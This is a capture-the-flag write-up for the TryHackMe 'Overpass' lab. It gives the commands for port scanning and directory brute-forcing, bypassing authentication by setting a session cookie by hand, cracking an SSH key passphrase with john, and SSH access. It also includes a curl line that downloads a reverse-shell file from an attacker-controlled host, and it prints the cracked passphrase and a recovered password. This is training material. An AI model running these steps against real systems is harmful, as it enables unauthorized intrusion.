# Writeup for THM room [Overpass](https://tryhackme.com/room/overpass)

```fish
set -gx IP 10.10.33.60
```

## Init nmap scan

```fish
sudo nmap -sN -sC -sV -oN nmap/init $IP
```

> Ports: 22, 80

## Gobuster

```fish
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## login Page

* found interesting codes snippet on `/admin` > `login.js`

```javascript
const response = await postData("/api/login", creds)
const statusOrCookie = await response.text()
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value=""
} else {
    Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
}
```

> set cookie manually `Cookies.set("SessionToken","")` and reload page


## Crack ssh keyphrase

* Downloaded RSA Key found on `/admin`
* transformed to john format `ssh2john id_rsa > ssh2john.txt`
* cracked with john `john ssh2john.txt`

> Found keyphrase: `james13`

## Connect via ssh

```fish
ssh -i ./id_rsa james@$IP
# keypass: james13
```

```go
URL=http://10.18.94.63:8000/rev-shell.go
LFILE=shell.go
curl $URL -o $LFILE
```

Password stored in overpass:

* System: `saydrawnlyingpicture`
